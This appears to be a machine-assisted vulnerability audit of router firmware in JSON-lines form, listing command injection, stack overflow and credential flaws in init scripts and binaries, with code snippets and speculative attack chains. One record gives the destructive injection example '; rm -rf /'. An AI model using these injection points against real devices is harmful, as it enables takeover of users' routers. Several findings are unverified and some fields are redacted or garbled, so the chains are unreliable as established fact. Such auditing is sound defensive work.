{"name": "config-ipv6-static_setup", "file_path": "etc/init.d/S16ipv6.sh", "location": "etc/init.d/S16ipv6.sh:unknown (unknown) unknown", "risk_score": 0.0, "confidence": 4.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["forwarding", "accept_dad", "disable_ipv6", "ip6tables", "FORWARD", "REDACTED_SENSITIVE_DATA"], "notes": "Static configuration lacks external input interfaces and does not constitute an attack chain component."}
{"name": "command_execution-event_handler-phpsh_interface", "file_path": "etc/init0.d/S40gpioevent.sh", "location": "etc/init0.d/S40gpioevent.sh", "risk_score": 6.0, "confidence": 5.75, "description": "The script invokes external PHP scripts (e.g., update_wpsled.php) via phpsh to handle events, using hardcoded event name parameters (e.g., 'EVENT=WPS_ERROR'). While the current parameters are fixed and pose no injection risk, if the invoked PHP script contains parameter injection vulnerabilities (e.g., unfiltered EVENT parameter leading to command injection), an attacker could potentially achieve remote code execution by triggering specific events (e.g., forging a WPS.INPROGRESS event). Trigger conditions: 1) The attacker can forge event input (requires verification of event generation mechanism); 2) The target PHP script has security flaws. Boundary check: All event names in the script are hardcoded with no dynamic concatenation.", "link_identifiers": ["phpsh", "update_wpsled.php", "update_wanled.php", "EVENT=", "WPS.INPROGRESS"], "notes": "Subsequent analysis is required for the secure implementation of PHP scripts in the /etc/scripts/ directory, with a focus on validating the EVENT parameter handling logic. The event generation mechanism (e.g., WPS event trigger sources) must undergo independent auditing to determine attack feasibility."}
{"name": "service_control-opt.local-action_parameter_handling", "file_path": "mydlink/opt.local", "location": "mydlink/opt.local:0 (service_control) 0x0", "risk_score": 5.0, "confidence": 7.0, "description": "The script receives the external action parameter via $1 and uses a case statement to restrict it to predefined values of start/stop/restart, with other values only triggering a help prompt. There is currently no direct injection risk, but if subcomponents (signalc/mydlink-watch-dog.sh) do not securely handle parameters, it could form a secondary attack chain. Trigger condition: passing illegal action values; Constraint: dependent on subcomponent vulnerabilities.", "link_identifiers": ["action=$1", "case $action in", "start)", "stop)", "restart)", "signalc", "mydlink-watch-dog.sh"], "notes": "Specialized analysis is required for the parameter handling security of signalc and mydlink-watch-dog.sh."}
{"name": "service_control-opt.local-process_kill_mechanism", "file_path": "mydlink/opt.local", "location": "mydlink/opt.local:0 (service_control) 0x0", "risk_score": 3.0, "confidence": 5.0, "description": "Using `ps | grep` to match hardcoded process names (mydlink-watch-dog/signalc/tsa), then extracting the PID with sed and killing it. The process names are not contaminated by external input, but if the process names are tampered with (e.g., containing `;`), command injection may occur. Trigger condition: The process names are maliciously controlled; Constraint: The current process names are hardcoded.", "link_identifiers": ["ps | grep mydlink-watch-dog", "sed 's/^[ \t]*//'", "kill -9 $p", "killall -9 signalc"]}
{"name": "file_operation-opt.local-provision_conf_deletion", "file_path": "mydlink/opt.local", "location": "mydlink/opt.local:0 (service_control) 0x0", "risk_score": 2.0, "confidence": 3.0, "description": "Forcefully deleting /tmp/provision.conf before service startup is likely a security measure to clear temporary configurations. This may impact components relying on the file, requiring verification of its specific function. Trigger condition: Automatically executed during service startup; Constraint: File path is fixed.", "link_identifiers": ["rm /tmp/provision.conf", "/tmp/provision.conf"], "notes": "Verify the purpose of /tmp/provision.conf in other components"}
{"name": "process_launch-opt.local-background_service_init", "file_path": "mydlink/opt.local", "location": "mydlink/opt.local:0 (service_control) 0x0", "risk_score": 6.0, "confidence": 7.5, "description": "The background process launches signalc and mydlink-watch-dog.sh, both of which may handle external inputs such as network/IPC. If vulnerabilities exist (e.g., buffer overflow), a complete attack chain from this script to the subcomponents can be formed. Trigger condition: the subcomponents receive malicious input after service startup; constraint: depends on the security of the subcomponents.", "link_identifiers": ["/mydlink/signalc > /dev/null 2>&1 &", "/mydlink/mydlink-watch-dog.sh signalc 2>&1 &", "signalc", "mydlink-watch-dog.sh"], "notes": "Specialized analysis is required for the external input handling mechanisms of signalc and mydlink-watch-dog.sh."}
{"name": "[HIDDEN]-MYDLINK", "file_path": "etc/init.d/S22mydlink.sh", "location": "etc/init.d/S22mydlink.sh:mount[HIDDEN]", "risk_score": 8.0, "confidence": 7.5, "description": "The mount operation uses the environment variable $MYDLINK as the source path for squashfs. Trigger condition: The script is executed during system startup and $MYDLINK is tainted. Constraint check: No path validation or whitelist restrictions. Security impact: An attacker controlling $MYDLINK to mount a malicious filesystem could lead to arbitrary code execution (requires combining with $MYDLINK tainting pathways).", "code_snippet": "mount -t squashfs $MYDLINK /mydlink", "link_identifiers": ["MYDLINK", "mount", "squashfs", "/mydlink"], "notes": "Verify the definition location of $MYDLINK (possibly in the parent script or environment configuration)"}
{"name": "NVRAM[HIDDEN]-dev_uid", "file_path": "etc/init.d/S22mydlink.sh", "location": "etc/init.d/S22mydlink.sh:uid[HIDDEN]", "risk_score": 7.5, "confidence": 7.0, "description": "The NVRAM data flow for dev_uid and lanmac is manipulated via the devdata tool. Trigger condition: dev_uid is unset during initial boot. Constraint check: relies on lanmac's physical unclonability but lacks software verification. Security impact: potential device UID forgery by exploiting devdata vulnerabilities (requires devdata security validation), compromising device authentication systems.", "code_snippet": "uid=`devdata get -e dev_uid`\nmac=`devdata get -e lanmac`\ndevdata set -e dev_uid=$uid", "link_identifiers": ["devdata", "dev_uid", "lanmac", "get -e", "set -e"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "[HIDDEN]-mydlinkuid", "file_path": "etc/init.d/S22mydlink.sh", "location": "etc/init.d/S22mydlink.sh:[HIDDEN]", "risk_score": 6.5, "confidence": 6.25, "description": "External command execution chain (mydlinkuid â†’ erase_nvram.sh â†’ reboot). Trigger condition: Executed after initial generation of dev_uid. Constraint check: No frequency limitation on calls. Security impact: If command injection vulnerability exists in mydlinkuid, it could form an exploit chain, where erase_nvram.sh may lead to a denial-of-service attack through configuration erasure.", "code_snippet": "uid=`mydlinkuid $mac`\n/etc/scripts/erase_nvram.sh\nreboot", "link_identifiers": ["mydlinkuid", "erase_nvram.sh", "reboot", "/etc/scripts/"], "notes": "Follow-up analysis directions: 1) Reverse engineer mydlinkuid 2) Examine erase_nvram.sh contents 3) Verify reboot call protection"}
{"name": "configuration_load-xmldb-param-image_sign", "file_path": "etc/init.d/S20init.sh", "location": "S20init.sh:2-3", "risk_score": 6.0, "confidence": 6.5, "description": "During system startup, the script reads the image_sign variable from /etc/config/image_sign and directly passes it to the -n parameter of xmldb (lines 2-3) without any input validation, filtering, or boundary checks. If an attacker can tamper with this configuration file (e.g., through path traversal or privilege escalation vulnerabilities), malicious parameters may be injected to affect xmldb execution. Trigger conditions include: 1) The attacker obtains write permissions for /etc/config/image_sign; 2) System reboot or service reload. The potential impact depends on how xmldb processes the parameters, possibly leading to command injection or memory corruption.", "code_snippet": "image_sign=`cat /etc/config/image_sign`\nxmldb -d -n $image_sign -t > /dev/console", "link_identifiers": ["image_sign", "xmldb", "-n", "/etc/config/image_sign", "dbload.sh"], "notes": "configuration_load  \n\nAnalyze the processing logic of the -n parameter in xmldb binary verification; no direct risks were identified during the startup of servd/LOGD services. Recommended follow-up actions: 1) Trace the write points of /etc/config/image_sign 2) Investigate parameter parsing vulnerabilities in the xmldb program."}
{"name": "command_injection-watch_dog-script_param", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:10", "risk_score": 9.0, "confidence": 8.75, "description": "The script uses the positional parameter $1 as a process name without any filtering or validation, directly employing it in command execution (/mydlink/$1), process searching (grep /mydlink/$1), and process termination (killall -9 $1). Trigger conditions: When a higher-level component (such as an init script or cron task) calling this script passes a malicious $1 parameter: 1) If $1 contains command separators (e.g., ;, &&), arbitrary command injection becomes possible; 2) Crafting an abnormal process name can cause grep/sed processing errors; 3) Parameter pollution in killall can terminate critical processes. Security impact: Attackers can achieve remote code execution (RCE) or denial of service (DoS), with the severity depending on the script's execution privileges.", "code_snippet": "pid=`ps | grep /mydlink/$1 | grep -v grep | sed 's/^[ \\t]*//' | sed 's/ .*//'`\nkillall -9 $1\n/mydlink/$1 > /dev/null 2>&1 &", "link_identifiers": ["$1", "/mydlink/$1", "grep /mydlink/$1", "killall -9 $1", "sed 's/^[ \\t]*//'"], "notes": "Verify how the script caller passes the $1 parameter to confirm attack feasibility."}
{"name": "dos-watch_dog-unconditional_reboot", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:27", "risk_score": 7.5, "confidence": 7.0, "description": "Unconditional Device Reboot Mechanism: Executes the reboot command when the process startup failure count (restart_cnt) exceeds 6 times. Combined with $1 parameter pollution, an attacker can deliberately trigger startup failures by passing invalid process names. Trigger Condition: 7 consecutive startup failures (approximately 21 seconds, based on a 3-second monitoring interval). Security Impact: Causes persistent denial of service (device enters reboot loop), disrupting all services.", "code_snippet": "restart_cnt=`expr $restart_cnt + 1`\nif [ \"$restart_cnt\" -gt 6 ]; then\n  reboot\nfi", "link_identifiers": ["restart_cnt", "reboot", "/mydlink/$1"]}
{"name": "unintended_restart-watch_dog-file_check", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:7", "risk_score": 5.0, "confidence": 6.5, "description": "Checking the existence of the /tmp/provision.conf file triggers a service restart: when the file does not exist, execute /mydlink/opt.local restart. Trigger condition: an attacker deletes the /tmp/provision.conf file (e.g., through other vulnerabilities or temporary file cleanup). Security impact: causes unexpected service restart resulting in brief interruption, but automatic recovery occurs.", "code_snippet": "if [ -f \"/tmp/provision.conf\" ]; then\n  echo \"got provision.conf\" > /dev/null\nelse\n  /mydlink/opt.local restart\nfi", "link_identifiers": ["/tmp/provision.conf", "/mydlink/opt.local restart"]}
{"name": "race_condition-watch_dog-ps_processing", "file_path": "mydlink/mydlink-watch-dog.sh", "location": "mydlink-watch-dog.sh:20", "risk_score": 4.0, "confidence": 3.25, "description": "Race condition exists when using grep/sed to process ps output: Process state changes during PID acquisition may lead to misjudgment. Combined with $1 parameter pollution, it could bypass process checking logic. Boundary check: Only verifies if pid is empty without handling invalid PID formats. Security impact: May interfere with monitoring logic but has limited practical exploitation value.", "code_snippet": "pid=`ps | grep /mydlink/$1 | grep -v grep | sed 's/^[ \\t]*//' | sed 's/ .*//'`\nif [ -z \"$pid\" ]; then\n  # restart logic\nfi", "link_identifiers": ["pid", "ps | grep /mydlink/$1", "sed 's/^[ \\t]*//'"], "notes": "The actual impact needs to be verified in conjunction with process scheduling behavior."}
{"name": "command_execution-watchdog_control-S95watchdog", "file_path": "etc/init0.d/S95watchdog.sh", "location": "etc/init0.d/S95watchdog.sh:3-21", "risk_score": 7.0, "confidence": 7.25, "description": "The script processes the $1 parameter (start/stop) via a case statement. During startup, it executes three watchdog scripts under /etc/scripts/ in the background; during shutdown, it terminates processes using killall. Risk points: 1) $1 only performs basic matching without filtering special characters (e.g., ';', '&&'), potentially causing command injection if the caller fails to sanitize input; 2) killall terminates processes by name, which may accidentally kill processes with identical names; 3) directly executing /etc/scripts/*.sh scripts could lead to arbitrary code execution if the scripts are tampered with. Trigger conditions: an attacker controls the script invocation parameters or replaces the called scripts. Actual impact: command injection could obtain shell privileges, while script tampering could enable persistent attacks.", "code_snippet": "case \"$1\" in\nstart)\n\t/etc/scripts/wifi_watchdog.sh &\n\t/etc/scripts/noise_watchdog.sh &\n\t/etc/scripts/xmldb_watchdog.sh &\n\t;;\nstop)\n\tkillall wifi_watchdog.sh\n\tkillall noise_watchdog.sh\n\tkillall xmldb_watchdog.sh\n\t;;\nesac", "link_identifiers": ["$1", "case", "killall", "/etc/scripts/wifi_watchdog.sh", "/etc/scripts/noise_watchdog.sh", "/etc/scripts/xmldb_watchdog.sh"], "notes": "Verification required: 1) How the init system calling this script passes the $1 parameter (related record: mydlink/opt.local processes action=$1 but only for predefined values) 2) Directory permissions of /etc/scripts/ 3) Secondary vulnerabilities in called scripts. Note: Compared to opt.local's kill mechanism (risk 3.0), the killall miskill risk here is higher."}
{"name": "command_execution-WIFI-dynamic_script_execution", "file_path": "etc/init0.d/S52wlan.sh", "location": "etc/init0.d/S52wlan.sh", "risk_score": 8.0, "confidence": 6.75, "description": "The text translates to English as:\n\ncommand_execution\n\nBy calling an external PHP script via xmldbc to generate /var/init_wifi_mod.sh and execute it directly (chmod +x; /bin/sh). If the PHP file contains command injection vulnerabilities (such as unfiltered ACTION parameters), attackers can achieve RCE by contaminating PHP input. Trigger conditions: 1) The PHP file does not validate input 2) The attacker controls PHP execution environment variables or input parameters.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["xmldbc", "rtcfg.php", "init_wifi_mod.php", "/var/init_wifi_mod.sh", "ACTION"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "hardware_input-WIFI-alpha_nvram_write", "file_path": "etc/init0.d/S52wlan.sh", "location": "etc/init0.d/S52wlan.sh", "risk_score": 6.0, "confidence": 6.25, "description": "Directly read and write to /proc/alpha_nvram. Perform write operations when detecting all-zero devdata. If this interface contains kernel vulnerabilities (such as buffer overflow), attackers may trigger them by corrupting devdata. Trigger conditions: 1) Unverified write operations exist in /proc/alpha_nvram 2) Attackers control the written data.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["/proc/alpha_nvram", "devdata", "TXBF_CAL"], "notes": "The knowledge base contains the keyword 'devdata' (located in erase_nvram.sh), requiring verification of cross-component data flow correlation."}
{"name": "service_management-WIFI-forced_restart", "file_path": "etc/init0.d/S52wlan.sh", "location": "etc/init0.d/S52wlan.sh", "risk_score": 5.5, "confidence": 6.0, "description": "The PHYINF.WIFI service is forcibly restarted every 5 seconds through an infinite loop. If the attacker can terminate the wlan process, it will trigger continuous service interruption. Trigger condition: The attacker obtains process termination privileges (e.g., through other vulnerabilities).", "code_snippet": "while :; do\n  [ -n \"`pidof wlan`\" ] || service PHYINF.WIFI\n  sleep 5\ndone", "link_identifiers": ["PHYINF.WIFI", "wlan_daemon", "service"], "notes": "Correlate and analyze the PHYINF.WIFI service implementation, which may serve as the endpoint in a denial-of-service attack chain."}
{"name": "network_input-stack_overflow-http_accept_language", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0 (fcn.0000ac78) 0xac78", "risk_score": 8.5, "confidence": 8.0, "description": "Unverified stack buffer overflow vulnerability: An attacker triggers this by setting excessively long HTTP headers (such as Accept-Language). The environment variable HTTP_ACCEPT_LANGUAGE, obtained via getenv, is directly copied to a fixed-size stack buffer (offset -0x1028) using strcpy without length validation. Due to the lack of boundary checks, this can overwrite the return address to achieve code execution. Trigger condition: Sending an HTTP request containing an Accept-Language header exceeding 1028 bytes.", "code_snippet": "strcpy(puVar6, getenv(\"HTTP_ACCEPT_LANGUAGE\"));", "link_identifiers": ["strcpy", "getenv", "HTTP_ACCEPT_LANGUAGE", "stack buffer"], "notes": "The exact buffer size needs to be confirmed through dynamic analysis, but the lack of boundary checks in strcpy already constitutes a high risk. The source of contamination is the HTTP header, with the propagation path being: HTTP header â†’ getenv â†’ strcpy â†’ stack buffer."}
{"name": "network_input-command_injection-range_env", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0 (fcn.0000aacc) 0xaacc", "risk_score": 9.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sprintf(param_1, \"cp %s %s\", param_1, param_2);\nsprintf(puVar6, \"/usr/bin/upload %s %s\", puVar6);", "link_identifiers": ["sprintf", "system", "RANGE", "RANGE_FLOOR", "RANGE_CEILING", "cp", "/usr/bin/upload"], "notes": "The pollution source is HTTP parameters â†’ environment variables; propagation path: RANGE â†’ sprintf â†’ system; need to verify whether /usr/bin/upload exists"}
{"name": "network_input-path_traversal-range_validation", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0 (fcn.0000ac78) 0xac78", "risk_score": 6.5, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "iVar3 = strstr(*puVar6, \"..\");", "link_identifiers": ["strstr", "..", "RANGE", "RANGE_FLOOR"], "notes": "Shares taint source with command injection; subsequent analysis recommendation: check if file operation functions (fopen) are affected by this"}
{"name": "script-init-S19init", "file_path": "etc/init.d/S19init.sh", "location": "S19init.sh:2-5", "risk_score": 0.0, "confidence": 5.0, "description": "The script performs only basic system initialization: 1) Creates static directories under /var (line 2) 2) Writes hardcoded configuration files (resolv.conf/TZ/hosts). It has no external input interfaces, no variable operations, all paths are fixed with no boundary checking requirements. No security risks can be triggered by attackers since the script processes no external input and has no subsequent service interactions.", "code_snippet": "mkdir -p /var/etc /var/log /var/run...\necho -n > /var/etc/resolv.conf\necho -n > /var/TZ\necho \"127.0.0.1 hgw\" > /var/hosts", "link_identifiers": ["mkdir", "echo", "/var/etc/resolv.conf", "/var/TZ", "/var/hosts"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "static_init-S10init_sh", "file_path": "etc/init.d/S10init.sh", "location": "etc/init.d/S10init.sh", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["mount", "echo", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "nvram_get-gpiod-S45gpiod_sh", "file_path": "etc/init.d/S45gpiod.sh", "location": "etc/init.d/S45gpiod.sh:3-7", "risk_score": 7.5, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["gpiod", "wanidx", "xmldbc", "REDACTED_SENSITIVE_DATA", "-w"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "hardcoded_credential-telnetd-image_sign", "file_path": "etc/init0.d/S80telnetd.sh", "location": "S80telnetd.sh:0 (telnetd[HIDDEN])", "risk_score": 9.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["telnetd", "-u", "Alphanetworks", "image_sign", "/etc/config/image_sign", "br0", "orig_devconfsize"], "notes": "Subsequent verification is required to determine whether the image_sign file contains sensitive device information; correlate with existing records in '/etc/config/image_sign'."}
{"name": "integer_overflow-telnetd_timeout-ALWAYS_TN", "file_path": "etc/init0.d/S80telnetd.sh", "location": "S80telnetd.sh:0 (telnetd[HIDDEN])", "risk_score": 8.5, "confidence": 6.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["telnetd", "-t", "entn", "ALWAYS_TN", "devdata", "NVRAM"], "notes": "Reverse analyze the telnetd binary to verify the parameter processing logic; correlate with existing 'devdata' records."}
{"name": "unauthorized_service_activation-telnetd-devconfsize", "file_path": "etc/init0.d/S80telnetd.sh", "location": "S80telnetd.sh:0 ([HIDDEN])", "risk_score": 7.0, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["entn", "ALWAYS_TN", "orig_devconfsize", "xmldbc", "REDACTED_SENSITIVE_DATA", "devdata", "dbload.sh"], "notes": "nvram_set"}
{"name": "stack_overflow-udev_config-01", "file_path": "sbin/udevtrigger", "location": "udevtrigger: dbg.udev_config_init â†’ dbg.parse_config_file", "risk_score": 9.5, "confidence": 8.5, "description": "High-risk stack overflow vulnerability (CWE-121): An attacker controls the configuration file path via the environment variable 'UDEV_CONFIG_FILE', triggered by setting this variable before program startup. The program uses strlcpy to copy the path (boundary-safe), but when loading the configuration file, the memcpy operation in the dbg.parse_config_file function copies file contents into a stack buffer (auStack_230) of only 52 bytes, while allowing up to 511 bytes of data. Exploitation method: Crafting a malicious configuration file of 52-511 bytes to overwrite the return address and achieve arbitrary code execution. Actual impact: Combined with environment variable setting interfaces in the firmware (e.g., web service), this could form a remote code execution attack chain.", "link_identifiers": ["UDEV_CONFIG_FILE", "getenv", "dbg.udev_config_init", "dbg.parse_config_file", "memcpy", "auStack_230", "dbg.buf_get_line", "file_map", "strlcpy", "*0x9d08"], "notes": "Pending verification: 1) Firmware environment variable control points 2) ASLR/NX protection status 3) Actual stack offset calculation"}
{"name": "init_param-S40event-event_registration", "file_path": "etc/init0.d/S40event.sh", "location": "etc/init0.d/S40event.sh:3", "risk_score": 6.0, "confidence": 6.5, "description": "The script execution flow is controlled by the positional parameter $1 ('start' triggers event registration). If an attacker gains control over initialization parameters (requiring REDACTED_PASSWORD_PLACEHOLDER privileges), they could manipulate the event registration logic. The primary risk lies in the registered handlers (e.g., reboot.sh) potentially containing vulnerabilities, though permission restrictions prevent verification of specific implementations. Attack path: control init parameters â†’ tamper with event registration â†’ trigger vulnerable handlers.", "code_snippet": "if [ \"$1\" = \"start\" ]; then\n event WAN-1.UP add \"service INFSVCS.WAN-1 restart\"", "link_identifiers": ["$1", "event", "service", "start"], "notes": "Subsequent analysis is required for subscripts such as /etc/events/reboot.sh; associate with the keyword '$1' in the knowledge base (e.g., mydlink/opt.local)."}
{"name": "nvram-S40event-mfcmode_hijack", "file_path": "etc/init0.d/S40event.sh", "location": "etc/init0.d/S40event.sh:13", "risk_score": 7.5, "confidence": 6.75, "description": "The command `devdata get -e mfcmode` retrieves an NVRAM value that controls the network service startup branch. If an attacker tampers with the mfcmode value (e.g., via an NVRAM write vulnerability), they can manipulate the LAN service startup behavior (choosing to launch either the ENLAN or INFSVCS.LAN-1 service). The full attack chain involves: contaminating NVRAM â†’ manipulating the service startup branch â†’ triggering a vulnerable service. The risk level is high because NVRAM contamination may not require REDACTED_PASSWORD_PLACEHOLDER privileges.", "code_snippet": "mfcmode=`devdata get -e mfcmode`\nif [ \"$mfcmode\" = \"1\" ]; then\n event LAN-1.UP add \"service ENLAN start\"", "link_identifiers": ["mfcmode", "devdata", "event LAN-1.UP", "service ENLAN"], "notes": "Verify the security of the devdata command and the implementation of ENLAN service; relate to knowledge base keyword 'devdata' (erase_nvram.sh)"}
{"name": "command_injection-http_param-01", "file_path": "mydlink/signalc", "location": "signalc:0x12e90", "risk_score": 9.5, "confidence": 8.75, "description": "High-risk command injection vulnerability: Attackers inject arbitrary commands by controlling a specific parameter (param_3) in HTTP requests. Trigger conditions: 1) Sending a crafted malicious HTTP request to the target endpoint 2) The parameter contains shell metacharacters (e.g., '; rm -rf /'). REDACTED_PASSWORD_PLACEHOLDER cause: The function directly uses snprintf to concatenate user input into a command string without any filtering or escaping, ultimately executing via popen. Actual impact: Achieves remote code execution (RCE), allowing complete device control.", "code_snippet": "snprintf(cmd_buf, 0xff, \"%s %s\", base_cmd, param_3);\npopen(cmd_buf, \"r\");", "link_identifiers": ["param_3", "snprintf", "popen", "Util_Shell_Command"], "notes": "Network_input+command_execution requires verification of specific HTTP endpoints and parameter names. Potential correlation points: No data flow correlation found with existing stack overflow vulnerabilities."}
{"name": "hardcoded_cred-authentication-01", "file_path": "mydlink/signalc", "location": "signalc:0x1cc14", "risk_score": 8.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["memcpy", "param_1", "TEKVMEJA-HKPF-CSLC-BLAM-"], "notes": "Need to confirm the packet receiving interface. Correlation discovery: Another memcpy vulnerability exists in the knowledge base (sbin/udevtrigger), but there is no evidence of data flow interaction."}
{"name": "attack_chain-env_pollution-01", "file_path": "sbin/udevtrigger", "location": "[HIDDEN]htdocs/fileaccess.cgi â†’ sbin/udevtrigger", "risk_score": 9.5, "confidence": 8.25, "description": "Complete Remote Code Execution Attack Chain: The attacker sets an excessively long Accept-Language header via an HTTP request (polluting the environment variable HTTP_ACCEPT_LANGUAGE) â†’ The fileaccess.cgi component triggers a stack overflow upon retrieval via getenv (Risk 8.5); or command injection via the RANGE parameter (Risk 9.0). Simultaneously, the polluted environment variable can propagate to the udevtrigger component: If an interface exists to set 'UDEV_CONFIG_FILE' (e.g., a web service), a high-risk stack overflow is triggered (Risk 9.5). Actual Impact: A single HTTP request can achieve arbitrary code execution.", "link_identifiers": ["getenv", "system", "memcpy", "stack buffer", "HTTP_ACCEPT_LANGUAGE", "UDEV_CONFIG_FILE", "RANGE"], "notes": "Critical Missing Link: The setting point for 'UDEV_CONFIG_FILE' has not yet been located. Follow-up requires specialized analysis: 1) The web service's mechanism for writing environment variables 2) The calling method of the parent process (e.g., init script) for udevtrigger."}
{"name": "command_execution-WIFI.PHYINF-exec_sh_attack_chain", "file_path": "etc/init0.d/S51wlan.sh", "location": "etc/init0.d/S51wlan.sh:7", "risk_score": 8.0, "confidence": 6.5, "description": "Attack Path: Contaminate the /var/run/exec.sh file â†’ Trigger S51wlan.sh during system WiFi service startup/shutdown â†’ Execute the event EXECUTE add command â†’ Execute the contaminated exec.sh. Trigger Conditions: 1) Attacker can write to /var/run/exec.sh (requires file write vulnerability) 2) Trigger wireless service restart (e.g., via network request). Constraints: exec.sh must exist and be executable. Potential Impact: Full device control (RCE).", "code_snippet": "event EXECUTE add \"sh /var/run/exec.sh\"", "link_identifiers": ["event EXECUTE", "exec.sh", "/var/run/exec.sh", "service WIFI.PHYINF", "case \"$1\""], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-wlan_get_chanlist_php_interface", "file_path": "etc/init0.d/S51wlan.sh", "location": "etc/init0.d/S51wlan.sh:12", "risk_score": 4.0, "confidence": 5.0, "description": "The invocation of wlan_get_chanlist.php by phpsh poses potential risks. The script path is hardcoded (etc/scripts/wlan_get_chanlist.php) with no parameter passing. However, if the PHP file's internal processing fails to sanitize inputs (such as $_GET/$_POST), it may introduce secondary vulnerabilities. The current script presents no direct risk.", "code_snippet": "phpsh etc/scripts/wlan_get_chanlist.php", "link_identifiers": ["phpsh", "wlan_get_chanlist.php"], "notes": "Analyze PHP files in the www or scripts directories by bypassing directory restrictions. Related record: Existing findings (name: command_execution-event_handler-phpsh_interface) indicate a risk of event parameter injection when phpsh calls PHP scripts, requiring joint analysis."}
{"name": "command_execution-ntfs_mount-env_injection", "file_path": "sbin/ntfs-3g", "location": "ntfs-3g:0x4846c", "risk_score": 8.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["execl", "/bin/mount", "PATH", "LD_PRELOAD", "setuid", "fork", "REDACTED_SENSITIVE_DATA"], "notes": "It is necessary to verify the environment variable control points (such as /etc/profile or rc scripts) in conjunction with the firmware boot process."}
{"name": "command_execution-ntfs_umount-param_injection", "file_path": "sbin/ntfs-3g", "location": "ntfs-3g:0x4865c", "risk_score": 7.0, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["execl", "/bin/umount", "param_2", "fcn.000482c0", "REDACTED_SENSITIVE_DATA", "setuid"], "notes": "It is necessary to trace the data source of param_2 (it is recommended to analyze components related to mount.ntfs)"}
{"name": "command_execution-global_pointer-pollution", "file_path": "sbin/ntfs-3g", "location": "ntfs-3g:0xfd40", "risk_score": 6.0, "confidence": 5.0, "description": "Global pointer pollution risk (fcn.000106a0): The execl parameters depend on global pointers *0xf9e4/*0xf9e8. If these pointers are initialized by external input without validation, it may lead to command injection. Triggering requires REDACTED_PASSWORD_PLACEHOLDER privileges and successful fork.", "link_identifiers": ["fcn.000106a0", "*0xf9e4", "*0xf9e8", "geteuid", "fork"], "notes": "Reverse the global pointer initialization logic"}
{"name": "network_input-httpd-command_injection-fcn000158c4", "file_path": "sbin/httpd", "location": "sbin/httpd:0x159f8 (fcn.000158c4)", "risk_score": 9.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sym.imp.execve(piVar3[-6], piVar3[-7], piVar3[-8]); // [HIDDEN]", "link_identifiers": ["fcn.0000acb4", "fcn.0000a3f0", "fcn.000158c4", "piVar3[-7]", "sym.imp.execve", "param_2", "puVar6[-0x344]", "0x3d"], "notes": "The device needs to enable the CGI function (usually enabled by default). Subsequent recommendations: 1) Check the ScriptAlias configuration in /etc/httpd.conf 2) Analyze whether CGI scripts have secondary contamination."}
{"name": "analysis_task-env_control_verification", "file_path": "sbin/ntfs-3g", "location": "[HIDDEN]", "risk_score": 0.0, "confidence": 5.0, "description": "Pending verification task: Audit of environment variable control points. Analyze environment initialization files such as /etc/profile and rc scripts to confirm whether PATH/LD_PRELOAD can be set through the following entry points: 1) Network interfaces (e.g., HTTP header injection) 2) NVRAM parameters 3) Configuration files. Successful verification will complete the environment variable injection attack chain.", "link_identifiers": ["PATH", "LD_PRELOAD", "getenv", "setenv", "/etc/profile"], "notes": "Related vulnerabilities: command_execution-ntfs_mount-env_injection"}
{"name": "analysis_task-param_2_source_tracking", "file_path": "sbin/ntfs-3g", "location": "sbin/mount.ntfs", "risk_score": 0.0, "confidence": 5.0, "description": "Verification Task: Tracing Parameters of the mount.ntfs Component. Reverse engineering of the mount.ntfs-related components is required to confirm whether the param_2 parameter parses user-controllable mount options (such as device names or mount flags). Successful verification will establish the initial input point for the parameter injection attack chain.", "link_identifiers": ["param_2", "mount.ntfs", "fstab", "[HIDDEN]"], "notes": "Associated Vulnerability: command_execution-ntfs_umount-param_injection"}
{"name": "analysis_task-global_pointer_init", "file_path": "sbin/ntfs-3g", "location": "ntfs-3g:[HIDDEN]", "risk_score": 0.0, "confidence": 5.0, "description": "Verification Task: Global Pointer Initialization Analysis. Reverse-engineer the initialization functions of *0xf9e4/*0xf9e8 to confirm: 1) Initialization timing 2) Data source (whether external input is involved) 3) Presence of out-of-bounds write risks. Verification results will determine the feasibility of global pointer contamination vulnerabilities.", "link_identifiers": ["*0xf9e4", "*0xf9e8", "[HIDDEN]", "fcn.000106a0"], "notes": "Associated vulnerability: command_execution-global_pointer-pollution"}
